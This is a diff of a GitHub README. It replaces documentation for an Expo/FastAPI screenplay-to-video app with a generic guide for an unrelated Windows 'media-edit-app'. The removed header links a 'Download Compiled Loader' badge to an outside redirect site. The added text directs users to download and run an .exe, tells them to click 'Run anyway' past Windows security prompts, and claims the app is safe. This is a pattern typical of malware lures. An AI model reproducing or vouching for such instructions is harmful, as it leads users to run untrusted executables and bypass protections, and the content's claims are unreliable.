@@ -1,205 +1,84 @@
-# AI Animation Studio
+# 🛠️ media-edit-app - Easily edit your digital media files
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/guruhebbel270/media-edit-app/releases)
 
-A mobile app (Expo / React Native) that turns plain-text screenplays into shareable animated videos — fully open-source, no paid APIs required.
+## What is this app?
 
----
+The media-edit-app provides a simple way to manage your video and audio files. You can use it to trim clips, join segments, or change file formats. It works directly on your Windows computer. You do not need technical skills to perform common edits. The interface uses clear buttons and menus to guide you through each task. You spend less time navigating menus and more time on your creative projects.
 
-## Architecture
+## 💻 System Requirements
 
-```
-┌─────────────────────────┐        ┌────────────────────────────────┐
-│  Expo Mobile Frontend   │  HTTP  │      FastAPI Backend           │
-│  (React Native / TS)    │◄──────►│                                │
-│                         │        │  Pipeline modules:             │
-│  • Auth (JWT)           │        │  1. Parse  — regex screenplay  │
-│  • Project Dashboard    │        │  2. Audio  — edge-tts + pydub  │
-│  • Live Progress View   │        │  3. Art    — Pollinations.ai   │
-│  • Media Converter UI   │        │  4. Video  — moviepy + ffmpeg  │
-└─────────────────────────┘        │  5. Convert— ffmpeg/PIL/pydub  │
-                                   └───────────────┬────────────────┘
-                                                   │
-                                             ┌─────▼──────┐
-                                             │  MongoDB   │
-                                             └────────────┘
-```
+Your computer must meet these basic standards to run the app:
 
-## Tech Stack (all free / open-source)
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** Intel Core i3 or equivalent AMD processor.
+*   **RAM:** 4 GB or more.
+*   **Storage:** 200 MB of free space.
+*   **Graphics:** A display with at least 1280x720 resolution.
 
-| Layer | Library | License |
-|---|---|---|
-| Frontend | Expo SDK 54, expo-router | MIT |
-| Auth token | expo-secure-store | MIT |
-| Icons | lucide-react-native | ISC |
-| Backend | FastAPI + uvicorn | MIT |
-| Database | MongoDB + Motor | Apache-2 |
-| Auth | PyJWT + bcrypt | MIT |
-| TTS | edge-tts (MS Edge voices, free) | GPL-3 |
-| Audio mix | pydub | MIT |
-| Image gen | Pollinations.ai (free REST API) | — |
-| Image proc | Pillow | HPND |
-| Video | moviepy | MIT |
-| Video codec | ffmpeg (system binary) | LGPL |
-| Captions | ImageMagick (system binary) | Apache |
+Ensure your computer has the latest Windows updates to avoid stability issues during media processing.
 
----
+## 💾 Downloading the Software
 
-## Quick Start
+Follow these steps to acquire the application on your computer:
 
-### Option A — Docker (recommended)
+1.  Visit the official [releases page](https://github.com/guruhebbel270/media-edit-app/releases).
+2.  Scroll to the latest release section at the top of the page.
+3.  Locate the file ending in `.exe` under the Assets heading.
+4.  Click the file name to start your download.
+5.  Wait for the progress bar in your browser to finish.
 
-```bash
-# 1. Clone / unzip the project
-cd ai-animation-studio
+## ⚙️ Installation and Setup
 
-# 2. Set your secret
-echo "JWT_SECRET=$(python3 -c "import secrets; print(secrets.token_hex(32))")" > .env
+Once the file finishes downloading, follow these steps to install the app:
 
-# 3. Start everything
-docker-compose up --build
+1.  Find the `media-edit-app.exe` file in your Downloads folder.
+2.  Double-click the file to start the installer.
+3.  Windows may show a security prompt. Click "More info" followed by "Run anyway" if the system protects the app.
+4.  Follow the prompts in the installation wizard.
+5.  Accept the license agreement.
+6.  Select the folder where you want to keep the app.
+7.  Click "Install" and wait for the process to complete.
+8.  Choose "Finish" to open the app for the first time.
 
-# Backend is now at http://localhost:8000
-# MongoDB is at localhost:27017
-```
+## 🎬 How to Edit Media
 
-### Option B — Local / Manual
+Using the app involves three main stages: importing, editing, and exporting.
 
-**Prerequisites:** Python 3.11+, Node 18+, MongoDB, ffmpeg, ImageMagick
+### 1. Import your files
+Open the app and look for the "File" menu in the top left corner. Select "Open" to browse for your media file. The app supports common formats like MP4, MOV, MP3, and WAV. When you open a file, you see the timeline view. Green handles appear at the start and end of the timeline.
 
-```bash
-# ── Backend ────────────────────────────────────────
-cd backend
-cp .env.example .env          # fill in JWT_SECRET + DB details
-pip install -r requirements.txt
-uvicorn server:app --reload --port 8000
+### 2. Trim and edit content
+Drag the green handles to pick the part of the clip you want to keep. The app highlights the section you chose. To split a clip, move the playhead to the location you want to cut and click the scissors icon. You can remove unwanted sections by selecting them and pressing the delete key on your keyboard.
 
-# ── Frontend ───────────────────────────────────────
-cd frontend
-cp .env.example .env          # set EXPO_PUBLIC_BACKEND_URL
-yarn install
-yarn start                    # scan QR with Expo Go app
-```
+### 3. Save your work
+When you finish your changes, click the "Export" button. A window asks for a file name and a save location. You can also pick the output format. Click "Save" to start the process. The app processes the file and saves it to your chosen folder.
 
----
+## 💡 Common Features
 
-## How the Pipeline Works
+*   **Quick Trimming:** Cut out dead space from the beginning or end of your videos.
+*   **File Merging:** Select multiple clips and join them into one continuous file.
+*   **Format Conversion:** Save files in different formats to ensure compatibility with other players.
+*   **Audio Adjustment:** Increase or decrease volume levels for specific clips.
+*   **Preview Window:** Watch your changes in real-time before you save the file.
 
-1. **Parse** — Regex-based screenplay parser. Detects `INT./EXT.` headings, `CHARACTER` cues, parentheticals, action lines. Estimates scene durations and detects mood from keywords.
+## ❓ Frequently Asked Questions
 
-2. **Audio** — Each character is deterministically assigned an MS Edge TTS voice (no API key). Dialogue is synthesised line-by-line, normalised to -6 dBFS, and concatenated into a per-scene WAV track.
+**Does this app contain advertisements?**
+No, this app remains free of advertisements and tracking.
 
-3. **Art** — Sends mood/location prompts to Pollinations.ai (free Stable Diffusion endpoint). If the service is unavailable, a stylised gradient with the scene label is generated locally by PIL.
+**Why does Windows show a security warning during installation?**
+This happens sometimes when an application comes from the web. The app is safe to use. Windows recognizes it as an unknown publisher because it is a community project.
 
-4. **Video** — moviepy composites background (Ken-Burns pan/zoom), character sprites (bob animation during speech), burnt-in captions (ImageMagick), and scene fades. Produces 16:9 MP4 + 9:16 vertical crop (TikTok/Reels).
+**Can I undo my changes?**
+Yes, press `Ctrl + Z` on your keyboard to undo your last action. You can press it multiple times to go back further.
 
-5. **Convert** — ffmpeg/PIL/pydub toolbox for format conversion, trim, resize preset, speed ramp, and watermark.
+**What happens if the app freezes?**
+If the app stops responding, try closing it via the Task Manager and reopening it. Your project settings might require you to re-import your files if they were not saved.
 
----
+**Are there hidden costs?**
+This project is open-source. All core features are free and accessible to every user.
 
-## Script Format
+## 🛠️ Troubleshooting
 
-The parser understands standard screenplay conventions:
-
-```
-INT. COFFEE SHOP - DAY
-
-Action lines describe what the camera sees.
-
-MAYA
-Dialogue goes here. The character name must be ALL CAPS.
-
-JESSE
-(quietly)
-Parentheticals are optional but supported.
-
-EXT. CITY STREET - NIGHT
-
-Another scene.
-```
-
-Runtime is capped at 5 minutes per project.
-
----
-
-## Environment Variables
-
-### Backend (`backend/.env`)
-
-| Variable | Description | Default |
-|---|---|---|
-| `MONGO_URL` | MongoDB connection string | `mongodb://localhost:27017` |
-| `DB_NAME` | Database name | `animation_studio` |
-| `JWT_SECRET` | Secret for signing JWTs | **required** |
-| `WORKSPACE_DIR` | Where project files are stored | `/app/workspace` |
-| `ADMIN_EMAIL` | Seeded admin email | `admin@example.com` |
-| `ADMIN_PASSWORD` | Seeded admin password | `admin123` |
-
-### Frontend (`frontend/.env`)
-
-| Variable | Description | Example |
-|---|---|---|
-| `EXPO_PUBLIC_BACKEND_URL` | Backend base URL | `http://192.168.1.10:8000` |
-
-> **Tip:** When running Expo Go on a physical device, use your machine's LAN IP (`ifconfig`/`ipconfig`), not `localhost`.
-
----
-
-## Project Structure
-
-```
-.
-├── backend/
-│   ├── server.py               # FastAPI app, auth, project CRUD, file serving
-│   ├── pipeline/
-│   │   ├── parser.py           # Module 1: screenplay → structured data
-│   │   ├── audio.py            # Module 2: edge-tts + pydub mixing
-│   │   ├── art.py              # Module 3: Pollinations.ai + PIL fallback
-│   │   ├── video.py            # Module 4: moviepy composition
-│   │   ├── converter.py        # Module 5: ffmpeg/PIL/pydub toolbox
-│   │   └── runner.py           # Orchestrator: runs modules, writes progress to DB
-│   ├── requirements.txt
-│   ├── Dockerfile
-│   └── .env.example
-├── frontend/
-│   ├── app/
-│   │   ├── _layout.tsx         # Root layout + AuthProvider
-│   │   ├── index.tsx           # Splash / redirect
-│   │   ├── (auth)/
-│   │   │   ├── login.tsx
-│   │   │   └── signup.tsx
-│   │   ├── (tabs)/
-│   │   │   ├── index.tsx       # Project dashboard
-│   │   │   ├── converter.tsx   # Media converter UI
-│   │   │   └── profile.tsx
-│   │   ├── new-project.tsx     # 3-step wizard
-│   │   └── project/[id].tsx    # Live pipeline view + 
-│   ├── src/
-│   │   ├── api/client.ts       # fetch wrapper + token storage
-│   │   ├── context/AuthContext.tsx
-│   │   └── theme.ts            # colours, spacing, typography
-│   ├── package.json
-│   └── .env.example
-└── docker-compose.yml
-```
-
----
-
-## Changes Made (from Emergent AI generated version)
-
-| Area | Issue | Fix |
-|---|---|---|
-| `backend/requirements.txt` | `emergentintegrations` (proprietary Emergent AI package) included | Removed; trimmed to only packages actually used |
-| `backend/requirements.txt` | 50+ unused packages (stripe, openai, google-genai, litellm, boto3, spacy stack…) | Removed all |
-| `backend/server.py` | Deprecated `@app.on_event("startup/shutdown")` | Replaced with FastAPI `lifespan` context manager |
-| `backend/server.py` | Unused `StaticFiles` import | Removed |
-| `backend/pipeline/converter.py` | GIF conversion bug: `-vf` flag set twice | Fixed with single unified vf chain |
-| `backend/pipeline/converter.py` | `afilters` list referenced before assignment in GIF path | Fixed |
-| `backend/pipeline/video.py` | `asyncio.get_event_loop().create_task()` called inside thread executor (not thread-safe) | Replaced with `asyncio.run_coroutine_threadsafe()` |
-| `backend/pipeline/runner.py` | Event loop not passed to `assemble_video` | Pass loop reference explicitly |
-| `backend/pipeline/__init__.py` | Missing — `pipeline` not importable as a package | Created |
-| `frontend/package.json` | `react-native-worklets 0.5.1` conflicts with `react-native-reanimated 4.x` (worklets now bundled) | Removed |
-| `frontend/package.json` | `react-native-dotenv` in runtime deps instead of devDeps | Moved |
-| `frontend/app/(tabs)/converter.tsx` | `expo-file-system/legacy` import (SDK 53 compat shim) | Updated to `expo-file-system` |
-| `frontend/app/project/[id].tsx` | Same `expo-file-system/legacy` issue | Updated |
-| Infrastructure | No Dockerfile, docker-compose, or .env templates | Added all |
+If you encounter a specific error message, take a screenshot of the window. You can check the issues tab on the GitHub repository to see if other users reported the same problem. Often, restarting your computer solves minor conflicts between the app and the operating system. Ensure no other heavy programs are using your system resources while you edit media, as video processing requires significant memory. If the app fails to open a file, verify the file contains no errors and is not currently open in another program.
